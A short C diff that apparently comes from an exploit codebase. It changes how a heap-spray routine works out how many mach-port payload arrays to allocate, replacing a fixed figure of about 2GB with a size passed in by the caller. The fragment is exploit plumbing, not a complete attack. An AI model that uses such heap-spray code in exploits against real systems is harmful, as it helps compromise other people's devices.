@@ -90,10 +90,12 @@ void heap_spray_init(size_t size)
 static mach_port_t *payloads = NULL;
 static size_t num_payloads = 0;
 
-bool heap_init(size_t size)
+bool heap_init(size_t memsize, size_t size)
 {
-    // Round to smallest amount just over 2GB
-    num_payloads = (SPRAY_AMOUNT + ((HEAP_PAYLOAD_NUM_ARRAYS * size) - 1)) / (HEAP_PAYLOAD_NUM_ARRAYS * size);
+    // Round to smallest amount just over the desired size
+    uint64_t mask = HEAP_PAYLOAD_NUM_ARRAYS * size;
+    num_payloads = (memsize + (mask - 1)) / mask;
+
     payloads = malloc(num_payloads * sizeof(*payloads));
     if(payloads == NULL)
     {
